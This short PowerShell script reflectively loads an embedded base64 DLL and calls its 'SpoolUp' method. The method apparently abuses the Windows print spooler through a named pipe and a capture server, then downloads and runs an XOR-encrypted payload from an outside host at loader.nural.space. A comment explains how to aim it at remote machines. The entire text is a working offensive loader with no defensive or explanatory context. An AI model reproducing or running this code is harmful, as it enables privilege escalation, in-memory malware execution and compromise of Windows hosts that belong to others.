$StoolSample = @"
<BASE64_ENCODED_DLL>
"@

$bytes = [System.Convert]::FromBase64String($StoolSample)
$asm = [System.Reflection.Assembly]::Load($bytes)
$class = $asm.GetType('StoolSample.StoolSample')
$SpoolUp = $class.GetMethod('SpoolUp')
$hostname = (Get-CimInstance Win32_ComputerSystem).Name

# Target the localhost, modify for remote host.
# SpoolUp(string target, string captureServer, string pipeName, string payloadUrl, string xorKey)
$SpoolUp.Invoke($null, @("$hostname", "$hostname", "pipeLayer", "http://loader.nural.space/payloadenc.b64", "pood0genc"))

